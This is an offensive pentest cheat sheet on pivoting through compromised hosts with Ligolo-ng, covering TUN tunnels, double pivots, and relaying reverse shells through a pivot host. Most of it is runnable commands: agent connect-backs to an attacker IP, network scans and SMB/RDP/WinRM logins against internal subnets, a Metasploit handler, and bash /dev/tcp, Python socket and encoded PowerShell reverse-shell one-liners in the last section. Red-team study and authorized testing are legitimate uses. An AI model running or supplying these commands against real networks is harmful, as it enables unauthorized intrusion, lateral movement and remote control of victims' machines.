# Pivoting – Ligolo-ng

### Ligolo-ng Basic Setup — TUN-Based Pivoting [added: 2026-04]
- **Tags:** #Ligolo #LigoloNG #Pivoting #TUN #Tunneling #SubnetRouting #InternalNetwork #ReverseTunnel
- **Trigger:** Compromised a host that has access to an internal network segment unreachable from the attacker machine — need a full Layer 3 tunnel (not just SOCKS)
- **Prereq:** Ligolo-ng proxy binary on attacker + ligolo-ng agent binary on target + outbound connectivity from target to attacker on chosen port (default 11601) + root/sudo on attacker for TUN interface
- **Yields:** Full Layer 3 tunnel to internal network — all tools (nmap, crackmapexec, RDP, etc.) work natively without proxychains
- **Opsec:** Med
- **Context:** Ligolo-ng creates a TUN interface on the attacker machine and routes traffic through the compromised host. Unlike SOCKS proxies, this gives you a real network interface — no need for proxychains, all tools work natively. Faster and more reliable than chisel SOCKS for large scans.
- **Payload/Method:**
  ```bash
  # --- ATTACKER SETUP ---
  # Step 1: Create TUN interface
  sudo ip tuntap add user $(whoami) mode tun ligolo
  sudo ip link set ligolo up

  # Step 2: Start Ligolo-ng proxy (listener)
  ./proxy -selfcert -laddr 0.0.0.0:11601

  # --- TARGET (run agent) ---
  # Linux target:
  ./agent -connect <ATTACKER_IP>:11601 -ignore-cert

  # Windows target:
  .\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert

  # --- ATTACKER (in Ligolo proxy console) ---
  # Step 3: Select the session
  session
  # Choose the agent session (e.g., session 0)

  # Step 4: Check target's interfaces to identify internal subnets
  ifconfig

  # Step 5: Add route for the internal subnet
  # (Run in a separate terminal on attacker, NOT in ligolo console)
  sudo ip route add 10.10.10.0/24 dev ligolo
  # Adjust subnet to match what the target can reach

  # Step 6: Start the tunnel (back in ligolo console)
  start

  # --- ATTACKER (use tools natively) ---
  # No proxychains needed — tools hit the internal network directly
  nmap -sT -Pn 10.10.10.0/24
  crackmapexec smb 10.10.10.0/24
  xfreerdp /u:admin /p:password /v:10.10.10.50
  evil-winrm -i 10.10.10.50 -u admin -p password
  ```

### Ligolo-ng Double Pivot — Chaining Through Two Networks [added: 2026-04]
- **Tags:** #Ligolo #LigoloNG #DoublePivot #ChainedTunnel #MultiHop #DeepNetwork #SubnetChain #NestedPivot
- **Trigger:** Compromised a second host in an internal network (reached via first Ligolo tunnel) that has access to a third, deeper network segment
- **Prereq:** First Ligolo tunnel already established + agent binary transferred to the second-hop host + ligolo proxy listener accessible from the second-hop (via first tunnel or new listener)
- **Yields:** Full Layer 3 access to the third network segment through two chained tunnels — all tools work natively
- **Opsec:** Med
- **Context:** In complex enterprise networks, you often need to traverse multiple network segments (e.g., DMZ -> corporate -> server VLAN). Ligolo-ng supports chaining by running a second agent through the first tunnel. Add routes for the deeper subnet through the ligolo TUN interface.
- **Payload/Method:**
  ```bash
  # ASSUMPTION: First pivot is already running
  # Attacker -> Host1 (10.10.10.0/24) tunnel is active on 'ligolo' interface

  # --- ATTACKER ---
  # Step 1: Add a listener in the Ligolo proxy for the second agent
  # (In Ligolo proxy console, select the first agent session)
  session
  # Select Host1's session
  listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp

  # This makes Host1 listen on port 11602 and forward back to the proxy

  # --- HOST2 (reached via first tunnel) ---
  # Step 2: Transfer agent to Host2 and run it
  # Connect back through Host1's listener
  ./agent -connect <HOST1_INTERNAL_IP>:11602 -ignore-cert

  # --- ATTACKER (Ligolo proxy console) ---
  # Step 3: You should see the new agent session appear
  session
  # Select Host2's session

  # Step 4: Check Host2's interfaces
  ifconfig
  # Identify the deeper subnet (e.g., 172.16.0.0/24)

  # Step 5: Add route for the deeper subnet (separate terminal on attacker)
  sudo ip route add 172.16.0.0/24 dev ligolo

  # Step 6: Start the second tunnel
  start

  # --- ATTACKER ---
  # Now both subnets are accessible natively
  nmap -sT -Pn 172.16.0.0/24
  crackmapexec smb 172.16.0.0/24
  # Traffic path: Attacker -> ligolo TUN -> Host1 -> Host2 -> 172.16.0.0/24
  ```

### Ligolo-ng Listener for Reverse Shells Through Tunnel [added: 2026-04]
- **Tags:** #Ligolo #LigoloNG #ReverseShell #Listener #PortRedirect #TunnelListener #CallbackRelay #ShellCatcher
- **Trigger:** Need to catch a reverse shell or callback from an internal host that can only reach the pivot host (not the attacker directly)
- **Prereq:** Active Ligolo-ng tunnel + agent running on pivot host + ability to trigger a reverse shell from the target internal host to the pivot host's IP
- **Yields:** Reverse shell or tool callback from deep internal hosts relayed back to the attacker machine through the Ligolo tunnel
- **Opsec:** Med
- **Context:** When exploiting hosts behind a pivot, reverse shells need to connect back somewhere. Internal hosts can't reach your attacker machine directly, but they can reach the pivot host. Ligolo's listener feature binds a port on the pivot host that redirects traffic back to your attacker through the tunnel.
- **Payload/Method:**
  ```bash
  # ASSUMPTION: Ligolo tunnel is already running (attacker -> pivot host)

  # --- ATTACKER (Ligolo proxy console) ---
  # Step 1: Select the active agent session
  session
  # Select the pivot host session

  # Step 2: Add a listener — bind port 4444 on the pivot host,
  #         redirect to attacker's 127.0.0.1:4444
  listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

  # Verify listeners
  listener_list

  # --- ATTACKER (separate terminal) ---
  # Step 3: Start your listener on the attacker (catches the redirected shell)
  nc -lvnp 4444
  # Or for a better shell:
  rlwrap nc -lvnp 4444
  # Or use msfconsole:
  msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 127.0.0.1; set LPORT 4444; run"

  # --- TRIGGER REVERSE SHELL ON INTERNAL TARGET ---
  # Point the reverse shell at the PIVOT HOST's internal IP and port 4444
  # Example payloads (target connects to pivot host, Ligolo relays to attacker):

  # Bash
  bash -i >& /dev/tcp/<PIVOT_HOST_INTERNAL_IP>/4444 0>&1

  # PowerShell
  powershell -e <BASE64_ENCODED_REVSHELL_TO_PIVOT_IP:4444>

  # Python
  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<PIVOT_HOST_INTERNAL_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

  # Traffic flow: Internal target -> Pivot host:4444 -> Ligolo tunnel -> Attacker:4444
  ```
